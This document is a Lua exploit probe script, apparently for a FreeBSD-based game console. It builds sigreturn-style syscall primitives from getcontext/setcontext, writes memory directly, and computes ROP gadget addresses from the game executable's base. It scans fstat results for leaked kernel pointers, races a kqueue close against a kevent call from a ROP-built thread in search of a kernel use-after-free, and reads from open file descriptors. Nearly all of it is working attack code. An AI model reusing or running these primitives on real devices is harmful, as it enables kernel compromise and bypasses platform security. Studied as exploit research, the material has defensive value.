-- CRASH_CLASS: MODERATE
-- PROBE 143g: fstat all open FDs + kqueue close race
-- 143f found 22 open FDs via fcntl. Characterize each with fstat,
-- then attempt a kqueue close race for kernel UAF.

print("=== PROBE 143g: FD FSTAT + KQUEUE RACE ===")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function hex(v)
    if type(v) == "table" and v.h then
        return string.format("0x%08X%08X", v.h, v.l)
    end
    return string.format("0x%X", tonumber(v) or 0)
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end
local function safe_rd(addr)
    local ok, val = pcall(function() return memory.read_dword(addr) end)
    if ok then return to_num(val) end
    return nil
end
local function safe_rq(addr)
    local ok, val = pcall(function() return memory.read_qword(addr) end)
    if ok then return val end
    return nil
end
local function wq(addr, val) memory.write_qword(addr, val) end
local function wd(addr, val) memory.write_dword(addr, val) end

local sc20 = make_syscall(20)
local sc_gc = make_syscall(421)
local sc_sr = make_syscall(417)
local sc_mmap = make_syscall(477)
local sc_fcntl = make_syscall(92)

local pid = to_num(sc20())
print("pid=" .. pid)

local MC = 0x40
local srop_ctx = memory.alloc(0x500)
pcall(function() return sc_gc(uint64(srop_ctx)) end)
local base_rip = memory.read_qword(srop_ctx + MC + 0xA0)
local brh, brl = get_hi_lo(base_rip)
local sc_addr = uint64(string.format("0x%X%08X", brh, brl - 2))

local function ua(v)
    if type(v) == "table" and v.h then
        return uint64(string.format("0x%X%08X", v.h, v.l))
    end
    return uint64(string.format("0x%X", to_num(v)))
end

local function srop(num, a1, a2, a3, a4, a5, a6)
    pcall(function() return sc_gc(uint64(srop_ctx)) end)
    wq(srop_ctx + MC + 0xA0, sc_addr)
    wq(srop_ctx + MC + 0x38, uint64(num))
    if a1 then wq(srop_ctx + MC + 0x08, a1) end
    if a2 then wq(srop_ctx + MC + 0x10, a2) end
    if a3 then wq(srop_ctx + MC + 0x18, a3) end
    if a4 then wq(srop_ctx + MC + 0x50, a4) end
    if a5 then wq(srop_ctx + MC + 0x28, a5) end
    if a6 then wq(srop_ctx + MC + 0x30, a6) end
    local ok, rv = pcall(function() return sc_sr(uint64(srop_ctx)) end)
    return rv
end

local _, gpu = pcall(function()
    return sc_mmap(uint64(0), uint64(0x200000), uint64(3),
        uint64(0x1002), uint64("0xFFFFFFFFFFFFFFFF"), uint64(0))
end)

--------------------------------------------------------------------
-- [A] fstat all open FDs (0-25)
-- struct stat on FreeBSD is ~120 bytes
-- Key fields: st_dev(+0x00, 8B), st_ino(+0x08, 8B),
-- st_mode(+0x10, 2B), st_nlink(+0x12, 2B), st_uid(+0x14, 4B),
-- st_gid(+0x18, 4B), st_rdev(+0x1C, 8B), st_size(+0x30, 8B)
--------------------------------------------------------------------
print("--- [A] fstat scan ---")

local stat_buf = gpu + 0x1000
local type_names = {
    [0x1000] = "FIFO",
    [0x2000] = "CHR",
    [0x4000] = "DIR",
    [0x6000] = "BLK",
    [0x8000] = "REG",
    [0xA000] = "LNK",
    [0xC000] = "SOCK",
}

for fd = 0, 25 do
    -- Check if fd is open via fcntl first
    local ok_f, rv_f = pcall(function()
        return sc_fcntl(uint64(fd), uint64(3))
    end)
    if ok_f then
        local fh, fl = get_hi_lo(rv_f)
        if fl ~= 4294967295 then
            -- fd is open, fstat it
            for off = 0, 0x7F, 4 do wd(stat_buf + off, 0) end
            local rv_s = srop(189, uint64(fd), ua(stat_buf))
            local sh, sl = get_hi_lo(rv_s)

            if sl == 0 then
                local mode = safe_rd(stat_buf + 0x10) or 0
                local ftype = mode % 0x10000
                ftype = ftype - (ftype % 0x1000)
                local tname = type_names[ftype] or string.format("0x%X", ftype)
                local rdev_lo = safe_rd(stat_buf + 0x1C) or 0
                local rdev_hi = safe_rd(stat_buf + 0x20) or 0
                local size_lo = safe_rd(stat_buf + 0x30) or 0
                local ino_lo = safe_rd(stat_buf + 0x08) or 0

                print("[A] fd=" .. fd .. " type=" .. tname ..
                      " mode=0" .. string.format("%o", mode % 0x1000) ..
                      " flags=0x" .. string.format("%X", fl) ..
                      " rdev=" .. rdev_lo ..
                      " ino=" .. ino_lo ..
                      " size=" .. size_lo)

                -- Check for kernel pointers in stat buffer
                for off = 0, 0x78, 8 do
                    local q = safe_rq(stat_buf + off)
                    if q then
                        local qh, ql = get_hi_lo(q)
                        if qh >= 0xFFFF8000 and qh ~= 0xFFFFFFFF then
                            print("[A] *** KPTR fd=" .. fd .. " stat+" .. string.format("%02X", off) .. "=" .. hex(q) .. " ***")
                        end
                    end
                end
            end
        end
    end
end

--------------------------------------------------------------------
-- [B] Kqueue close race with threading
-- Thread A: loops kevent(363) with timeout on kqueue fd
-- Thread B: closes the kqueue fd while A is inside kevent
--------------------------------------------------------------------
print("")
print("--- [B] kqueue close race ---")

-- Get eboot base for ROP gadgets
local eboot_info = memory.alloc(0x200)
wd(eboot_info, 0x160)
local sc593 = make_syscall(593)
pcall(function() return sc593(uint64(0), uint64(eboot_info)) end)
local eb_lo = safe_rd(eboot_info + 0x108) or 0
local eb_hi = safe_rd(eboot_info + 0x10C) or 0
local eboot = uint64(string.format("0x%X%08X", eb_hi, eb_lo))
print("[B] eboot=" .. hex(eboot))

local function gadget(off)
    return uint64(string.format("0x%X%08X", eb_hi, eb_lo + off))
end

local pop_rdi = gadget(0xC9DFE)
local pop_rsi = gadget(0xD77D)
local pop_rdx = gadget(0x420E6D)
local pop_rax = gadget(0x992)
local pop_rcx = gadget(0xE64)
local ret_g = gadget(0x42)

local RACE_ROUNDS = 5
local race_hits = 0

for round = 1, RACE_ROUNDS do
    -- Create kqueue
    local rv_kq = srop(362, uint64(0))
    local kqh, kql = get_hi_lo(rv_kq)
    if kql >= 256 or kqh ~= 0 then
        print("[B] kqueue failed round " .. round)
        break
    end
    local kq_fd = kql

    -- Create socketpair for event source
    local sp = gpu + 0x2000
    wd(sp, 0xDEAD); wd(sp + 4, 0xDEAD)
    srop(135, uint64(1), uint64(1), uint64(0), ua(sp))
    local fd_a = safe_rd(sp) or 0
    local fd_b = safe_rd(sp + 4) or 0

    -- Register EVFILT_READ on fd_a
    local kev = gpu + 0x3000
    wq(kev + 0x00, uint64(fd_a))              -- ident
    wd(kev + 0x08, 0xFFFF)                     -- filter: EVFILT_READ=-1 (0xFFFF as short)
    wd(kev + 0x0A, 0x0001)                     -- flags: EV_ADD=1
    wd(kev + 0x0C, 0)                          -- fflags
    wq(kev + 0x10, uint64(0))                  -- data
    wq(kev + 0x18, uint64(0))                  -- udata

    -- kevent(kq, changelist, nchanges, eventlist, nevents, timeout)
    -- Register the event
    srop(363, uint64(kq_fd), ua(kev), uint64(1), uint64(0), uint64(0), uint64(0))

    -- Set up timeout struct (10ms)
    local ts = gpu + 0x4000
    wq(ts, uint64(0))           -- tv_sec = 0
    wq(ts + 8, uint64(10000000)) -- tv_nsec = 10ms

    -- Thread A: kevent wait (blocking for up to 10ms)
    -- Thread B: close(kq_fd)
    -- We need both to race. Use thr_create for thread B.

    -- Build thread B ROP chain: close(kq_fd)
    local chain_b = gpu + 0x10000 + round * 0x1000
    local ci = 0
    local function push(val) wq(chain_b + ci, val); ci = ci + 8 end

    -- close(kq_fd) via syscall
    push(pop_rdi)
    push(uint64(kq_fd))
    push(pop_rax)
    push(uint64(6))        -- SYS_close
    push(sc_addr)
    -- Spin: do nanosleep(1ms) then close fd_a too
    local sleep_ts = gpu + 0x5000 + round * 0x100
    wq(sleep_ts, uint64(0))
    wq(sleep_ts + 8, uint64(1000000))  -- 1ms
    push(pop_rdi)
    push(ua(sleep_ts))
    push(pop_rsi)
    push(uint64(0))
    push(pop_rax)
    push(uint64(240))     -- SYS_nanosleep
    push(sc_addr)
    -- exit thread
    push(pop_rdi)
    push(uint64(0))
    push(pop_rax)
    push(uint64(431))     -- SYS_thr_exit
    push(sc_addr)

    -- Create thread B context
    local thr_ctx = gpu + 0x20000 + round * 0x800
    for off2 = 0, 0x4FF, 4 do wd(thr_ctx + off2, 0) end
    pcall(function() return sc_gc(uint64(thr_ctx)) end)

    -- Set thread to run the ROP chain
    wq(thr_ctx + MC + 0xA0, ret_g)            -- rip = ret gadget
    wq(thr_ctx + MC + 0xB8, ua(chain_b))       -- rsp = chain start

    -- thr_create context
    local tc_param = gpu + 0x30000 + round * 0x100
    for off2 = 0, 0xFF, 4 do wd(tc_param + off2, 0) end
    wq(tc_param + 0x00, uint64(0x500))        -- mc_len
    wq(tc_param + 0x08, uint64(thr_ctx + MC)) -- mc_ptr
    wd(tc_param + 0x10, 0x40)                 -- mc_flags

    local tid_p = gpu + 0x40000 + round * 8
    wq(tid_p, uint64(0))

    -- Now: start thread B (it will close kq_fd),
    -- and immediately call kevent on kq_fd from main thread
    srop(430, ua(tc_param), uint64(0x500), ua(tid_p))
    local tid = safe_rd(tid_p) or 0

    -- Main thread: kevent wait on kq_fd (which thread B is closing)
    local ev_out = gpu + 0x6000
    for off2 = 0, 0x1F, 4 do wd(ev_out + off2, 0) end

    local rv_ke = srop(363, uint64(kq_fd), uint64(0), uint64(0),
                       ua(ev_out), uint64(1), ua(ts))
    local keh, kel = get_hi_lo(rv_ke)

    -- Check what happened
    local ev_ident = safe_rq(ev_out + 0x00)
    local ev_filter = safe_rd(ev_out + 0x08) or 0
    local ev_flags = safe_rd(ev_out + 0x0A) or 0
    local ev_data = safe_rq(ev_out + 0x10)

    print("[B] round=" .. round .. " kq=" .. kq_fd ..
          " kevent_ret=" .. kel ..
          " tid=" .. tid)

    if kel ~= 4294967295 and kel ~= 0 then
        race_hits = race_hits + 1
        print("[B] *** RACE HIT? kevent_ret=" .. kel .. " ***")
        if ev_ident then
            print("[B] ev_ident=" .. hex(ev_ident) .. " filter=" .. ev_filter ..
                  " flags=0x" .. string.format("%X", ev_flags))
            -- Check for kernel pointer in event data
            if ev_data then
                local edh, edl = get_hi_lo(ev_data)
                if edh >= 0xFFFF8000 and edh ~= 0xFFFFFFFF then
                    print("[B] *** KERNEL PTR in event data=" .. hex(ev_data) .. " ***")
                end
            end
        end
    end

    -- Wait for thread B
    srop(240, ua(sleep_ts), uint64(0))

    -- Cleanup (kq_fd already closed by thread B hopefully)
    srop(6, uint64(fd_a))
    srop(6, uint64(fd_b))
end

print("[B] race_hits=" .. race_hits .. " / " .. RACE_ROUNDS)

--------------------------------------------------------------------
-- [C] Try reading from open FDs to find useful ones
--------------------------------------------------------------------
print("")
print("--- [C] read open FDs ---")

local rbuf = gpu + 0x50000
for fd = 3, 21 do
    -- Only try O_RDONLY (0x0) and O_RDWR (0x2) fds
    local ok_f, rv_f = pcall(function()
        return sc_fcntl(uint64(fd), uint64(3))
    end)
    if ok_f then
        local fh, fl = get_hi_lo(rv_f)
        if fl == 0 or fl == 2 then
            for off = 0, 0x3F, 4 do wd(rbuf + off, 0) end
            -- Non-blocking read using MSG_DONTWAIT via recvfrom
            local rv_r = srop(3, uint64(fd), ua(rbuf), uint64(64))
            local rrh, rrl = get_hi_lo(rv_r)
            if rrl > 0 and rrl < 256 and rrh == 0 then
                print("[C] fd=" .. fd .. " read " .. rrl .. " bytes!")
                for off = 0, math.min(rrl - 1, 31), 4 do
                    local v = safe_rd(rbuf + off) or 0
                    print("[C]   +" .. string.format("%02X", off) .. "=0x" .. string.format("%08X", v))
                end
            end
        end
    end
end

print("")
print("=== DONE ===")
